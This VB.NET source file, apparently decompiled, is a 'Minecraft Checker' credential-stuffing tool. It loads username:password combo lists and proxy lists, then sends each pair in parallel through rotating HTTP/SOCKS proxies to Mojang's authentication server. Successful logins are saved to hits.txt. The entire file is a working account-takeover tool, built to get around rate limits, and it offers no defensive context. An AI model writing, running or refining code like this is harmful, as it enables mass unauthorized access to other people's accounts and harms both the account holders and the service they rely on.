﻿Imports System.Drawing
Imports System.IO
Imports System.Text
Imports System.Threading
Imports xNet

Module Module1

    Sub Main()
        Dim [class] As Module1.Class6 = New Module1.Class6()
        Dim source As List(Of String) = File.ReadAllLines("combo.txt").ToList()
        [class].list_0 = File.ReadAllLines("proxies.txt").ToList()
        Dim num As Integer = 244
        Dim num2 As Integer = 212
        Dim blue As Integer = 255
        For i As Integer = 0 To 1 - 1
            Colorful.Console.WriteAscii("DrWeabo", Color.FromArgb(num, num2, blue))
            num -= 18
            num2 -= 36
        Next
        Colorful.Console.Title = "Minecraft Checker by DrWeabo " & vbLf & ","
        Colorful.Console.WriteLine("Welcome to the Minecraft Checker! " & vbLf, Color.AntiqueWhite)
        Thread.Sleep(500)
        [class].int_1 = 0
        [class].int_2 = 0
        [class].int_3 = 0
        [class].int_0 = 0
        Using streamReader As StreamReader = File.OpenText("combo.txt")
            While streamReader.ReadLine() IsNot Nothing
                Dim num3 As Integer = [class].int_1
                [class].int_1 = num3 + 1
            End While
        End Using
        Try
            Colorful.Console.WriteLine("You have imported " + [class].int_1 + " accounts!", Color.Green)
            Colorful.Console.Title = String.Concat(New Object() {"DrWeabo - Minecraft Checker | Accounts loaded: ", [class].int_1, " | Hits: ", [class].int_3, " | Invalid: ", [class].int_0, " |"})
            Thread.Sleep(500)
        Catch ex As Exception

        End Try

        Using streamReader2 As StreamReader = File.OpenText("proxies.txt")
            While streamReader2.ReadLine() IsNot Nothing
                Dim num3 As Integer = [class].int_2
                [class].int_2 = num3 + 1
            End While
        End Using
        Try
            Colorful.Console.WriteLine("You have imported " + [class].int_2 + " proxies! " & vbLf, Color.Green)
            Colorful.Console.Title = String.Concat(New Object() {"DrWeabo - Minecraft Checker | Accounts loaded: ", [class].int_1, " | Proxies loaded: ", [class].int_2, " | Hits: ", [class].int_3, " | Invalid: ", [class].int_0, " |"})
            Thread.Sleep(500)
        Catch ex As Exception

        End Try

        Colorful.Console.WriteLine("Choose between HTTP/SOCKS4/SOCKS5", Color.DeepPink)
        Colorful.Console.Write("Proxies type: ")
        [class].string_0 = Colorful.Console.ReadLine().ToUpper()
        Colorful.Console.Write("Threads: ")
        Dim maxDegreeOfParallelism As Integer = Integer.Parse(Colorful.Console.ReadLine())
        Colorful.Console.WriteLine("")
        Parallel.ForEach(Of String)(source, New ParallelOptions() With {.MaxDegreeOfParallelism = maxDegreeOfParallelism}, AddressOf [class].method_0)
        Colorful.Console.WriteLine("Done", Color.White)
        Colorful.Console.ReadLine()
    End Sub



    Private Class Class6
        Friend Sub method_0(string_1 As String)
            While True
                Try
                    Dim text As String = string_1.Split(New Char() {":"c})(0)
                    Dim text2 As String = string_1.Split(New Char() {":"c})(1)
                    Using httpRequest As HttpRequest = New HttpRequest()
                        httpRequest.Proxy = Me.list_0(New Random().[Next](Me.list_0.Count))
                        httpRequest.Type = Me.string_0
                        httpRequest.ConnectTimeout = 5000
                        httpRequest.KeepAliveTimeout = 5000
                        httpRequest.ReadWriteTimeout = 5000
                        httpRequest.AddHeader("Content-Type", "application/json")
                        Dim text3 As String = httpRequest.Start(HttpMethod.POST, New Uri("https://authserver.mojang.com/authenticate"), New BytesContent(Encoding.UTF8.GetBytes(String.Concat(New String() {"{""agent"":{""name"":""Minecraft"",""version"":1},""username"":""", text, """,""password"":""", text2, """,""requestUser"":true}"})))).ToString()
                        If text3.Contains("errorMessage") Then
                            Colorful.Console.WriteLine(string_1, Color.DarkRed)
                            Dim num As Integer = Me.int_0
                            Me.int_0 = num + 1
                            Colorful.Console.Title = String.Concat(New Object() {"DrWeabo - Minecraft Checker | Accounts loaded: ", Me.int_1, " | Proxies loaded: ", Me.int_2, " | Hits: ", Me.int_3, " | Invalid: ", Me.int_0, " |"})
                            Thread.Sleep(New Random().[Next](25, 75))
                        ElseIf text3.Contains("selectedProfile") Then
                            Colorful.Console.WriteLine(string_1, Color.Green)
                            Dim num As Integer = Me.int_3
                            Me.int_3 = num + 1
                            Colorful.Console.Title = String.Concat(New Object() {"DrWeabo - Minecraft Checker | Accounts loaded: ", Me.int_1, " | Proxies loaded: ", Me.int_2, " | Hits: ", Me.int_3, " | Invalid: ", Me.int_0, " |"})
                            Thread.Sleep(New Random().[Next](25, 75))
                            While True
                                Try
                                    Using streamWriter As System.IO.StreamWriter = New System.IO.StreamWriter("hits.txt", True)
                                        streamWriter.WriteLine(string_1)
                                    End Using
                                    Exit While
                                Catch
                                    Thread.Sleep((New Random()).[Next](25, 75))
                                End Try
                            End While
                        End If
                    End Using
                Catch
                    Continue While
                End Try
                Exit While
            End While
        End Sub

        Public list_0 As List(Of String)

        Public string_0 As String

        Public int_0 As Integer

        Public int_1 As Integer

        Public int_2 As Integer

        Public int_3 As Integer
    End Class
End Module
